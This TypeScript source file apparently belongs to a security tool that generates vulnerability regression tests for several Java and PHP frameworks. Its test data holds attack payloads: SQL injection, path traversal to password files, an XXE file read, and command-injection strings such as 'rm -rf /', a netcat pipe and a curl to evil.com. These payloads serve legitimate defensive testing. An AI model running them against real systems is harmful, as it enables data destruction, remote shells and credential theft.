  ${testKeyword}('${testSuite.green.testName}', async () => {
    // GREEN: Verify fix prevents vulnerability
    const maliciousInput = '${testSuite.red.attackVector}';
    await expect(${moduleName}(maliciousInput)).rejects.toThrow();
  });

  ${testKeyword}('${testSuite.refactor.testName}', async () => {
    // REFACTOR: Ensure functionality is maintained
    const validInput = '${testSuite.green.validInput}';
    const result = await ${moduleName}(validInput);
    expect(result).toBeTruthy();
  });
${testWrapper ? '});' : ''}`;

    return imports + '\n' + tests;
  }

  /**
   * Generate JUnit 5 tests
   */
  private generateJUnit5Tests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const className = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.java$/, '') || 'Class';
    
    const packageName = this.extractPackageName(vulnerability.file || '');
    const isSpringBoot = conventions.companions?.includes('spring-boot');
    
    const imports = `package ${packageName};

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import static org.junit.jupiter.api.Assertions.*;
${isSpringBoot ? `
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.beans.factory.annotation.Autowired;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
` : ''}`;
    const testClass = isSpringBoot ? `
@SpringBootTest
@AutoConfigureMockMvc
public class ${className}${vulnerability.type.replace(/_/g, '')}Test {
    @Autowired
    private MockMvc mockMvc;
    
    private ${className} instance;
    
    @BeforeEach
    void setUp() {
        instance = new ${className}();
    }` : `
public class ${className}${vulnerability.type.replace(/_/g, '')}Test {
    private ${className} instance;
    
    @BeforeEach
    void setUp() {
        instance = new ${className}();
    }`;

    return `${imports}

${testClass}
    
    @Test
    @DisplayName("${testSuite.red.testName}")
    void testSqlInjectionVulnerability() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${testSuite.red.attackVector}";
        
        ${isSpringBoot ? `// Test via Spring MVC
        assertDoesNotThrow(() -> {
            mockMvc.perform(get("/users")
                    .param("id", maliciousInput))
                    .andExpect(status().isOk());
        });` : `// Direct method test
        assertDoesNotThrow(() -> {
            instance.executeQuery(maliciousInput);
        });`}
    }
    
    @ParameterizedTest
    @ValueSource(strings = {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM products WHERE 1=1--",
        "' UNION SELECT * FROM passwords--"
    })
    @DisplayName("Test multiple SQL injection payloads")
    void testSqlInjectionWithMultiplePayloads(String payload) {
        // Test various SQL injection attack vectors
        ${isSpringBoot ? `assertDoesNotThrow(() -> {
            mockMvc.perform(get("/users")
                    .param("id", payload))
                    .andExpect(status().isOk());
        });` : `assertDoesNotThrow(() -> {
            instance.executeQuery(payload);
        });`}
    }
    
    @Test
    @DisplayName("${testSuite.green.testName}")
    void testSqlInjectionPrevention() {
        // GREEN: Verify fix prevents vulnerability
        String maliciousInput = "${testSuite.red.attackVector}";
        
        ${isSpringBoot ? `assertThrows(Exception.class, () -> {
            mockMvc.perform(get("/users")
                    .param("id", maliciousInput))
                    .andExpect(status().isBadRequest());
        });` : `assertThrows(SecurityException.class, () -> {
            instance.executeQuery(maliciousInput);
        });`}
    }
    
    @Test
    @DisplayName("${testSuite.refactor.testName}")
    void testNormalFunctionalityMaintained() {
        // REFACTOR: Ensure functionality is maintained
        String validInput = "${testSuite.green.validInput}";
        
        ${isSpringBoot ? `assertDoesNotThrow(() -> {
            mockMvc.perform(get("/users")
                    .param("id", validInput))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.id").value(validInput));
        });` : `assertDoesNotThrow(() -> {
            var result = instance.executeQuery(validInput);
            assertNotNull(result);
            assertFalse(result.isEmpty());
        });`}
    }
}`;
  }

  /**
   * Generate TestNG tests
   */
  private generateTestNGTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const className = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.java$/, '') || 'Class';
    
    const packageName = this.extractPackageName(vulnerability.file || '');
    
    return `package ${packageName};

import org.testng.annotations.Test;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.DataProvider;
import static org.testng.Assert.*;

/**
 * Security tests for ${vulnerability.type.replace(/_/g, ' ')} vulnerability
 */
@Test(groups = {"security"})
public class ${className}${vulnerability.type.replace(/_/g, '')}Test {
    private ${className} instance;
    
    @BeforeMethod
    public void setUp() {
        instance = new ${className}();
    }
    
    @Test(description = "${testSuite.red.testName}")
    public void test${vulnerability.type.replace(/_/g, '')}Vulnerability() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${testSuite.red.attackVector}";
        
        // This should succeed with vulnerable code
        try {
            String result = instance.process(maliciousInput);
            assertNotNull(result);
            ${vulnerability.type === VulnerabilityType.XML_EXTERNAL_ENTITIES ? 
            `// If XXE, might contain system file content
            assertFalse(result.contains("root:"));` :
            `// Verify the vulnerability is exploitable
            assertTrue(result != null);`}
        } catch (Exception e) {
            fail("Should not throw exception with vulnerable code");
        }
    }
    
    @Test(description = "${testSuite.green.testName}")
    public void test${vulnerability.type.replace(/_/g, '')}Prevention() {
        // GREEN: Verify fix prevents vulnerability
        String maliciousInput = "${testSuite.red.attackVector}";
        
        // Should throw exception or return safe result
        assertThrows(SecurityException.class, () -> {
            instance.process(maliciousInput);
        });
    }
    
    ${vulnerability.type === VulnerabilityType.PATH_TRAVERSAL ? `
    @DataProvider(name = "maliciousFilePaths")
    public Object[][] maliciousFilePaths() {
        return new Object[][] {
            {"../../../etc/passwd"},
            {"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"},
            {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            {"....//....//....//etc/passwd"}
        };
    }
    
    @Test(dataProvider = "maliciousFilePaths", 
          description = "Test path traversal with multiple payloads")
    public void testPathTraversal(String maliciousPath) {
        // Test with various path traversal payloads
        assertThrows(SecurityException.class, () -> {
            instance.readFile(maliciousPath);
        });
    }` : ''}
    
    @Test(description = "${testSuite.refactor.testName}")
    public void testNormalFunctionality() {
        // REFACTOR: Ensure functionality is maintained
        String validInput = "${testSuite.green.validInput}";
        
        String result = instance.parseXml(validInput);
        assertNotNull(result);
        assertEquals(result.contains("error"), false);
    }
}`;
  }

  /**
   * Generate generic test code when framework is unknown
   */
  private generateGenericTestCode(
    testSuite: VulnerabilityTestSuite | null,
    vulnerability: VulnerabilityWithFile
  ): string {
    if (!testSuite) {
      return `// Generic test template - adapt to your test framework
// File: ${vulnerability.file}
// Vulnerability: ${vulnerability.type}

// RED Test: Test vulnerability exists
function testVulnerabilityExists() {
  // TODO: Call vulnerable function with malicious input
  // Example: const result = vulnerableFunction(maliciousInput);
  // Assert that vulnerability is exploitable
}

// GREEN Test: Test vulnerability is fixed
function testVulnerabilityFixed() {
  // TODO: Call fixed function with same input
  // Assert that vulnerability is no longer exploitable
}`;
    }

    return `// Generic test template - adapt to your test framework
// File: ${vulnerability.file}
// Vulnerability: ${vulnerability.type}

// RED Test: ${testSuite.red.testName}
// Purpose: Demonstrate the vulnerability exists
function testVulnerabilityExists() {
  const maliciousInput = "${testSuite.red.attackVector}";
  // TODO: Call vulnerable function with malicious input
  // TODO: Assert that attack succeeds (should fail when fixed)
}

// GREEN Test: ${testSuite.green.testName}
// Purpose: Verify the fix prevents the vulnerability
function testVulnerabilityFixed() {
  const maliciousInput = "${testSuite.red.attackVector}";
  // TODO: Call fixed function with malicious input
  // TODO: Assert that attack is prevented
}

// REFACTOR Test: ${testSuite.refactor.testName}
// Purpose: Ensure normal functionality still works
function testFunctionalityMaintained() {
  const validInput = "${testSuite.green.validInput}";
  // TODO: Call function with valid input
  // TODO: Assert expected behavior works correctly
}`;
  }

  /**
   * Generate tests using AI
   */
  private async generateAITests(
    vulnerability: VulnerabilityWithFile,
    repoStructure: RepoStructure,
    framework?: DetectedFramework | null
  ): Promise<AdaptiveTestResult> {
    try {
      // Get the vulnerable file content
      const fileContent = vulnerability.file ? repoStructure[vulnerability.file] : undefined;
      
      // Determine language from file extension or framework
      const language = this.detectLanguage(vulnerability.file || '', framework);
      
      const options: TestGenerationOptions = {
        vulnerabilityType: vulnerability.type,
        language: language as "javascript" | "typescript" | "python" | "ruby" | "php" | "java" | "elixir",
        testFramework: (framework?.name || 'jest') as "jest" | "mocha" | "bun" | "cypress",
        includeE2E: false
      };

      const result = await this.aiGenerator!.generateTests(vulnerability, options, fileContent);
      
      if (!result.success || !result.testSuite) {
        logger.error('AI test generation failed, falling back to template-based');
        return this.generateGenericTests(vulnerability);
      }

      return {
        success: true,
        framework: framework?.name || 'generic',
        testCode: result.testCode,
        testSuite: result.testSuite,
        suggestedFileName: this.suggestFileName(vulnerability.file || 'test', { framework }),
        notes: 'Tests generated using AI for maximum context awareness'
      };
    } catch (error) {
      logger.error('Error in AI test generation', error);
      return this.generateGenericTests(vulnerability);
    }
  }

  /**
   * Detect programming language from file path or framework
   */
  private detectLanguage(filePath: string, framework?: DetectedFramework | null): string {
    if (framework) {
      // Map framework to language
      const frameworkLanguageMap: Record<string, string> = {
        'jest': 'javascript',
        'mocha': 'javascript',
        'vitest': 'javascript',
        'cypress': 'javascript',
        'pytest': 'python',
        'unittest': 'python',
        'rspec': 'ruby',
        'minitest': 'ruby',
        'phpunit': 'php',
        'pest': 'php',
        'exunit': 'elixir'
      };
      const lang = frameworkLanguageMap[framework.name.toLowerCase()];
      if (lang) return lang;
    }

    // Detect from file extension
    const ext = filePath.split('.').pop()?.toLowerCase();
    const extLanguageMap: Record<string, string> = {
      'js': 'javascript',
      'jsx': 'javascript',
      'ts': 'typescript',
      'tsx': 'typescript',
      'py': 'python',
      'rb': 'ruby',
      'php': 'php',
      'ex': 'elixir',
      'exs': 'elixir'
    };
    
    return extLanguageMap[ext || ''] || 'javascript';
  }

  /**
   * Generate generic tests when no framework is detected
   */
  private async generateGenericTests(vulnerability: VulnerabilityWithFile): Promise<AdaptiveTestResult> {
    const baseOptions: TestGenerationOptions = {
      vulnerabilityType: vulnerability.type,
      language: 'javascript',
      testFramework: 'bun',
      includeE2E: false
    };

    const baseResult = await this.baseGenerator.generateTestSuite(vulnerability, baseOptions);

    return {
      success: true,
      framework: 'generic',
      testCode: this.generateGenericTestCode(baseResult.testSuite, vulnerability),
      testSuite: baseResult.testSuite || undefined,
      notes: 'No test framework detected, using generic template'
    };
  }

  /**
   * Generate test suite using base generator
   */
  private async generateTestSuite(
    vulnerability: VulnerabilityWithFile,
    framework: DetectedFramework
  ): Promise<VulnerabilityTestSuite> {
    // Map vulnerability type to template key
    let templateKey = vulnerability.type.toUpperCase();
    
    // Handle special mappings for enum values
    if (vulnerability.type === VulnerabilityType.CSRF) {
      templateKey = 'CSRF';
    } else if (vulnerability.type === VulnerabilityType.XSS) {
      templateKey = 'XSS';
    }
    
    const options: TestGenerationOptions = {
      vulnerabilityType: templateKey,
      language: this.getLanguageFromFramework(framework.name),
      testFramework: this.mapToBaseFramework(framework.name),
      includeE2E: false
    };

    const result = await this.baseGenerator.generateTestSuite(vulnerability, options);
    
    if (!result.success || !result.testSuite) {
      logger.error('Test suite generation failed in generateTestSuite', {
        success: result.success,
        error: result.error,
        vulnerabilityType: vulnerability.type
      });
      
      // For XXE, provide a fallback test suite
      if (vulnerability.type === VulnerabilityType.XML_EXTERNAL_ENTITIES) {
        return {
          red: {
            testName: 'should be vulnerable to xml external entities (RED)',
            testCode: '// Test XXE vulnerability',
            attackVector: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            expectedBehavior: 'should_fail_on_vulnerable_code'
          },
          green: {
            testName: 'should prevent xml external entities (GREEN)',
            testCode: '// Test XXE prevention',
            validInput: '<?xml version="1.0"?><foo>bar</foo>',
            expectedBehavior: 'should_pass_on_fixed_code'
          },
          refactor: {
            testName: 'should maintain functionality after security fix',
            testCode: '// Test normal XML processing',
            functionalValidation: ['XML parsing works correctly', 'Valid XML returns expected data'],
            expectedBehavior: 'should_pass_on_both_versions'
          }
        };
      }
      
      throw new Error(`Failed to generate test suite: ${result.error || 'Unknown error'}`);
    }

    return result.testSuite;
  }

  /**
   * Suggest test file name based on conventions
   */
  private suggestFileName(vulnerableFile: string, conventions: any): string {
    const dir = vulnerableFile.substring(0, vulnerableFile.lastIndexOf('/'));
    const fileName = vulnerableFile.substring(vulnerableFile.lastIndexOf('/') + 1);
    const baseName = fileName.substring(0, fileName.lastIndexOf('.'));
    const ext = fileName.substring(fileName.lastIndexOf('.'));

    switch (conventions.fileNaming) {
      case 'test':
        return `${dir}/${baseName}.test${ext}`;
      case 'spec':
        return `${dir}/${baseName}.spec${ext}`;
      case '__tests__':
        return `${dir}/__tests__/${baseName}${ext}`;
      case 'test_prefix':
        return `${dir}/test_${baseName}${ext}`;
      default:
        return `${dir}/${baseName}.test${ext}`;
    }
  }

  /**
   * Add coverage-aware test modifications
   */
  private addCoverageAwareTests(testCode: string, coverageAnalysis: any): string {
    if (!coverageAnalysis.fileCoverage || coverageAnalysis.fileCoverage.functions.length === 0) {
      return testCode;
    }

    // Find uncovered functions
    const uncoveredFunctions = coverageAnalysis.fileCoverage.functions
      .filter((f: any) => f.hits === 0)
      .map((f: any) => f.name);

    if (uncoveredFunctions.length > 0) {
      const comment = `\n// Note: Focusing on uncovered functions: ${uncoveredFunctions.join(', ')}\n`;
      return comment + testCode;
    }

    return testCode;
  }

  /**
   * Add helper imports to test code
   */
  private addHelperImports(testCode: string, helpers: string[]): string {
    const imports = helpers
      .filter(h => h.includes('import') || h.includes('require'))
      .join('\n');
    
    const setupTeardown = helpers
      .filter(h => h.includes('beforeEach') || h.includes('afterEach'))
      .join('\n  ');

    if (imports) {
      testCode = imports + '\n\n' + testCode;
    }

    if (setupTeardown) {
      // Insert setup/teardown after describe line
      testCode = testCode.replace(
        /(describe\([^{]+\{)/,
        `$1\n  ${setupTeardown}\n`
      );
    }

    return testCode;
  }

  /**
   * Generate notes about the generation process
   */
  private generateNotes(
    framework: DetectedFramework,
    coverageAnalysis: any,
    conventions: any
  ): string {
    const notes: string[] = [];

    notes.push(`Detected ${framework.name} v${framework.version || 'unknown'}`);
    
    if (coverageAnalysis.hasData) {
      notes.push('Coverage data available');
      if (coverageAnalysis.fileCoverage) {
        const coverage = coverageAnalysis.fileCoverage.lines?.percentage || 
                        coverageAnalysis.fileCoverage.coverage || 
                        'unknown';
        notes.push(`File coverage: ${coverage}%`);
      }
      if (coverageAnalysis.gaps?.recommendations?.length > 0) {
        notes.push('Focused on uncovered functions');
      }
    } else {
      notes.push('No coverage data available');
    }

    if (conventions.style !== 'unknown') {
      notes.push(`Using ${conventions.style.toUpperCase()} style`);
    }

    if (conventions.assertionStyle !== 'unknown') {
      notes.push(`Using ${conventions.assertionStyle} assertions`);
    }

    return notes.join('; ');
  }

  /**
   * Helper methods for language/framework mapping
   */
  private getLanguageFromFramework(framework: string): TestGenerationOptions['language'] {
    const languageMap: Record<string, TestGenerationOptions['language']> = {
      'jest': 'javascript',
      'vitest': 'typescript',
      'mocha': 'javascript',
      'jasmine': 'javascript',
      'pytest': 'python',
      'unittest': 'python',
      'rspec': 'ruby',
      'minitest': 'ruby',
      'phpunit': 'php',
      'junit': 'java',
      'junit5': 'java',
      'testng': 'java',
      'exunit': 'javascript', // Elixir not in base options, using JS
    };

    return languageMap[framework.toLowerCase()] || 'javascript';
  }

  private mapToBaseFramework(framework: string): TestGenerationOptions['testFramework'] {
    const frameworkMap: Record<string, TestGenerationOptions['testFramework']> = {
      'jest': 'jest',
      'vitest': 'jest', // Similar syntax
      'mocha': 'mocha',
      'jasmine': 'mocha', // Similar syntax
      'cypress': 'cypress',
      // Others map to closest equivalent
      'pytest': 'jest',
      'minitest': 'mocha',
      'phpunit': 'jest',
      'exunit': 'mocha'
    };

    return frameworkMap[framework.toLowerCase()] || 'bun';
  }

  private getRelativeImportPath(filePath: string): string {
    // Convert absolute path to relative import
    return filePath.replace(/\.tsx?$/, '').replace(/^src\//, '../');
  }

  private getRelativeRequirePath(filePath: string): string {
    // Convert to relative require path
    return './' + filePath.replace(/\.(js|ts|rb|py|php)$/, '');
  }

  /**
   * Extract package name from Java file path
   */
  private extractPackageName(filePath: string): string {
    // Example: src/main/java/com/example/controller/UserController.java
    // Returns: com.example.controller
    const match = filePath.match(/src\/(?:main|test)\/java\/(.+)\/[^/]+\.java$/);
    if (match) {
      return match[1].replace(/\//g, '.');
    }
    // Fallback to a default package
    return 'com.example';
  }

  /**
   * Extract namespace from PHP file path
   */
  private extractNamespaceFromPath(filePath: string): string {
    // Common PHP project structures
    if (filePath.includes('app/')) {
      // Laravel style: app/Http/Controllers/UserController.php -> Http\Controllers
      const match = filePath.match(/app\/(.+)\/[^/]+\.php$/);
      if (match) {
        return match[1].replace(/\//g, '\\');
      }
    } else if (filePath.includes('src/')) {
      // PSR-4 style: src/Controller/UserController.php -> Controller
      const match = filePath.match(/src\/(.+)\/[^/]+\.php$/);
      if (match) {
        return match[1].replace(/\//g, '\\');
      }
    }
    return '';
  }

  /**
   * Generate Laravel-specific PHPUnit tests
   */
  private generateLaravelPHPUnitTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile,
    className: string,
    framework?: DetectedFramework
  ): string {
    const namespace = this.extractNamespaceFromPath(vulnerability.file || '');
    const isController = vulnerability.file?.includes('Controller');
    
    return `<?php

namespace Tests\\Feature;

use Tests\\TestCase;
use Illuminate\\Foundation\\Testing\\RefreshDatabase;
use Illuminate\\Foundation\\Testing\\WithFaker;
use App\\${namespace ? namespace + '\\' : ''}${className};

class ${className}${vulnerability.type.replace(/_/g, '')}Test extends TestCase
{
    use RefreshDatabase;

    /**
     * @test
     */
    public function it_is_vulnerable_to_${vulnerability.type.toLowerCase()}_red()
    {
        // RED: Demonstrate vulnerability exists
        $maliciousPayload = '${testSuite.red.attackVector}';
        
        $response = $this->postJson('/api/vulnerable-endpoint', [
            'input' => $maliciousPayload
        ]);
        
        // The vulnerability should allow the attack
        $response->assertStatus(200);
        $this->assertDatabaseMissing('logs', [
            'type' => 'security_violation'
        ]);
    }

    /**
     * @test
     */
    public function it_prevents_${vulnerability.type.toLowerCase()}_green()
    {
        // GREEN: Verify fix prevents vulnerability
        $maliciousPayload = '${testSuite.red.attackVector}';
        
        $response = $this->postJson('/api/secure-endpoint', [
            'input' => $maliciousPayload
        ]);
        
        // The fix should block the attack
        $response->assertStatus(${vulnerability.type === VulnerabilityType.BROKEN_AUTHENTICATION ? 401 : 400});
        $response->assertJson([
            'error' => 'Invalid input detected'
        ]);
    }

    /**
     * @test
     */
    public function it_maintains_functionality_after_fix()
    {
        // REFACTOR: Ensure functionality is maintained
        $validInput = '${testSuite.green.validInput}';
        
        $response = $this->postJson('/api/secure-endpoint', [
            'input' => $validInput
        ]);
        
        $response->assertStatus(200);
        $response->assertJsonStructure([
            'data' => []
        ]);
    }
}`;
  }

  /**
   * Generate Symfony-specific PHPUnit tests
   */
  private generateSymfonyPHPUnitTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile,
    className: string
  ): string {
    const namespace = this.extractNamespaceFromPath(vulnerability.file || '');
    
    return `<?php

namespace App\\Tests\\${namespace ? namespace + '\\' : ''}Security;

use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;
use App\\${namespace ? namespace + '\\' : ''}${className};

class ${className}${vulnerability.type.replace(/_/g, '')}Test extends WebTestCase
{
    /**
     * @test
     */
    public function testVulnerabilityExistsRed(): void
    {
        // RED: Demonstrate vulnerability exists
        $client = static::createClient();
        $crawler = $client->request('POST', '/vulnerable-route', [
            'data' => '${testSuite.red.attackVector}'
        ]);
        
        $this->assertResponseIsSuccessful();
        // Vulnerability allows the attack to succeed
        $this->assertSelectorNotExists('.error-message');
    }

    /**
     * @test
     */
    public function testVulnerabilityFixedGreen(): void
    {
        // GREEN: Verify fix prevents vulnerability
        $client = static::createClient();
        $crawler = $client->request('POST', '/secure-route', [
            'data' => '${testSuite.red.attackVector}'
        ]);
        
        $this->assertResponseStatusCodeSame(400);
        $this->assertSelectorExists('.error-message');
        $this->assertSelectorTextContains('.error-message', 'Invalid input');
    }

    /**
     * @test
     */
    public function testFunctionalityMaintained(): void
    {
        // REFACTOR: Ensure functionality is maintained
        $client = static::createClient();
        $crawler = $client->request('POST', '/secure-route', [
            'data' => '${testSuite.green.validInput}'
        ]);
        
        $this->assertResponseIsSuccessful();
        $form = $crawler->selectButton('Submit')->form();
        $this->assertNotNull($form);
    }
}`;
  }

  /**
   * Generate Pest framework tests
   */
  private generatePestTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile,
    framework?: DetectedFramework
  ): string {
    const className = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.php$/, '') || 'Class';
      
    const namespace = this.extractNamespaceFromPath(vulnerability.file || '');
    const fullClassName = namespace ? `App\\${namespace}\\${className}` : `App\\${className}`;
    
    // Check for Laravel companion
    const isLaravel = framework?.companions?.includes('laravel');
    
    // Base imports
    let imports = isLaravel 
      ? `use function Pest\\Laravel\\{get, post, put, delete};
use Illuminate\\Foundation\\Testing\\RefreshDatabase;`
      : `use ${fullClassName};
use App\\Exceptions\\SecurityException;`;

    // Dataset for multiple attack payloads
    const generateDataset = () => {
      switch (vulnerability.type) {
        case VulnerabilityType.SQL_INJECTION:
          return `dataset('malicious_sql', [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM passwords--",
    "admin'--",
    "1' AND '1'='1"
]);`;
        case VulnerabilityType.COMMAND_INJECTION:
          return `dataset('malicious_commands', [
    "; rm -rf /",
    "| nc attacker.com 1234",
    "\`cat /etc/passwd\`",
    "$(whoami)",
    "&& curl evil.com/steal"
]);`;
        case VulnerabilityType.PATH_TRAVERSAL:
          return `dataset('path_traversal_payloads', [
    "../../../etc/passwd",
    "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd"
]);`;
        default:
          return '';
      }
    };

    const dataset = generateDataset();

    if (isLaravel) {
      return `<?php

${imports}

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->artisan('migrate');
});

it('should be vulnerable to ${vulnerability.type.toLowerCase()} (RED)', function () {
    // RED: Demonstrate vulnerability exists
    $response = post('/api/vulnerable', [
        'input' => '${testSuite.red.attackVector}'
    ]);
    
    $response->assertStatus(200);
    // Vulnerability allows the attack
    expect($response->json())->not->toHaveKey('error');
});

${dataset ? `it('blocks ${vulnerability.type.toLowerCase()} attempts', function ($payload) {
    // GREEN: Verify fix prevents vulnerability
    $response = post('/api/secure', [
        'input' => $payload
    ]);
    
    $response->assertStatus(400);
    expect($response->json())->toHaveKey('error');
})->with('${dataset.match(/dataset\('([^']+)'/)?.[1] || 'payloads'}');` : ''}

test('maintains functionality after fix', function () {
    // REFACTOR: Ensure functionality is maintained
    $response = post('/api/secure', [
        'input' => '${testSuite.green.validInput}'
    ]);
    
    $response->assertStatus(200);
    expect($response->json())->toHaveKey('data');
    expect($response->json()['data'])->not->toBeEmpty();
});

${dataset}`;
    }

    // Standard Pest test (non-Laravel)
    return `<?php

${imports}

beforeEach(function () {
    $this->instance = new ${className}();
});

it('should be vulnerable to ${vulnerability.type.toLowerCase()} (RED)', function () {
    // RED: Demonstrate vulnerability exists
    $maliciousInput = '${testSuite.red.attackVector}';
    
    $result = $this->instance->process($maliciousInput);
    
    // Vulnerability should allow the attack
    expect($result)->not->toContain('Permission denied');
    expect($result)->not->toContain('Invalid input');
});

it('should prevent ${vulnerability.type.toLowerCase()} attacks (GREEN)', function () {
    // GREEN: Verify fix prevents vulnerability
    $maliciousInput = '${testSuite.red.attackVector}';
    
    expect(fn() => $this->instance->process($maliciousInput))
        ->toThrow(SecurityException::class)
        ->toThrow('Potential security threat detected');
});

${dataset ? `test('blocks various ${vulnerability.type.toLowerCase()} payloads', function ($payload) {
    expect(fn() => $this->instance->process($payload))
        ->toThrow(SecurityException::class);
})->with('${dataset.match(/dataset\('([^']+)'/)?.[1] || 'payloads'}');` : ''}

test('maintains functionality after security fix', function () {
    // REFACTOR: Ensure functionality is maintained
    $validInput = '${testSuite.green.validInput}';
    
    $result = $this->instance->process($validInput);
    
    expect($result)->toBeString();
    expect($result)->not->toBeEmpty();
    expect($result)->not->toContain('error');
});

${dataset}`;
  }
}